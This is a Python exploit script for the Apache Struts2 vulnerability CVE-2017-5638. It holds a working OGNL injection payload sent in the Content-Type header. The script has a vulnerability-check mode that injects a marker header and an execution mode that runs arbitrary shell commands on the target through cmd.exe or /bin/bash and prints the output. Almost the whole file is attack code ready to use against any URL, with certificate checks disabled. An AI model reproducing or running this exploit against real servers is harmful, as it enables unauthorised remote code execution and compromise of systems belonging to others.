#!/usr/bin/env python3
# coding=utf-8


# CVE-2017-5638
# Julian Purgahn
# https://jpurg.com

# Description:
# A script that exploits the Apache Struts2 CVE-2017-5638 vulnerability to 
# execute arbitrary commands on a vulnerable server, for 1 URL only, with 
# options to check for vulnerability or execute commands remotely.

import sys
import random
import requests
import argparse

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass

if len(sys.argv) <= 1:
    print('[!] CVE-2017-5638 - Apache Struts2')
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

# Argument parser
parser = argparse.ArgumentParser(prog='CVE-2017-5638')
parser.add_argument("-u", "--url", help="Check a single URL.", action='store')
parser.add_argument("-c", "--cmd", help="Command to execute. (Default: id)", action='store', default='id')
parser.add_argument("--check", help="Check if a target is vulnerable.", action='store_true')
args = parser.parse_args()

url = args.url
cmd = args.cmd
do_check = args.check

# Prepare the URL for sending requests by encoding special characters and ensuring it has a protocol.
def url_prepare(url):
    # prevent interpretation as a fragment identifier to stop altered URL processing or routing
    url = url.replace('#', '%23')
    # encoding spaces to ensure URL is corretly interpreted
    url = url.replace(' ', '%20')
    if ('://' not in url):
        url = str('http') + str('://') + str(url)
    return(url)

# Exploit the Apache Struts2 CVE-2017-5638 vulnerability by sending a malicious payload to execute a command.
def exploit(url, cmd):
    url = url_prepare(url)
    print(f'\n[*] URL: {url}')
    print(f'[*] CMD: {cmd}')
    payload = (
            "%{(#_='multipart/form-data')."
            "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            "(#_memberAccess?(#_memberAccess=#dm):"
            "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            "(#ognlUtil.getExcludedPackageNames().clear())."
            "(#ognlUtil.getExcludedClasses().clear())."
            "(#context.setMemberAccess(#dm))))."
            f"(#cmd='{cmd}')."
            "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            "(#p=new java.lang.ProcessBuilder(#cmds))."
            "(#p.redirectErrorStream(true)).(#process=#p.start())."
            "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            "(#ros.flush())}"
    )
    
    headers = {
            'User-Agent': 'kloutkake-cve-2017-5638',
            'Content-Type': payload,
            'Accept': '*/*'
            }

    try:
        response = requests.get(url, headers=headers, verify=False, timeout=3, allow_redirects=False)
        return response.text
        #return random_string in response.headers and response.headers[random_string] == random_string
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False

# Check if the target URL is vulnerable to CVE-2017-5638 by sending a harmless payload and inspecting the response headers.
def check(url):
    url = url_prepare(url)
    print(f'\n[*] URL: {url}')

    random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(7))
    payload = (
            f"%{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']."
            f"addHeader('{random_string}','{random_string}')}}.multipart/form-data"
            )

    headers = {
            'User-Agent': 'struts-pwn',
            'Content-Type': payload,
            'Accept': '*/*'
            }

    try:
        response = requests.get(url, headers=headers, verify=False, timeout=3, allow_redirects=False)
        return random_string in response.headers and response.headers[random_string] == random_string
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False

def main():
    if url:
        if do_check:
            result = check(url)
            print(f'[*] Status: {"Vulnerable!" if result else "Not Affected."}')
        else:
            output = exploit(url, cmd)
            print(output)
    print('[*] Done.')


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[!] KeyboardInterrupt Detected...')
        sys.exit(0)
